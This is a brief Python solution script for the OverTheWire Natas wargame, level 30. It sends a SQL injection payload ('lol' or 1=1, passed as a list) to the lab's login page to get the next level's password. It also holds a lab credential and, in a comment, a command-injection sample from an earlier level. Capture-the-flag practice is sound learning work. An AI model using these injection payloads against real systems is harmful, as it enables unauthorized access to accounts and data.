import requests
from requests.auth import HTTPBasicAuth

#identified sample=^$(grep -o ^Wa natas16)I
user='natas30'
passw='WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH'

#clumsy but manageable
payload= {'username': 'natas31', 'password': ["'lol' or 1=1",4]}
answer=requests.post('http://natas30.natas.labs.overthewire.org/index.pl', data=payload,auth=HTTPBasicAuth(user,passw))
str1 = answer.text
print(answer.text)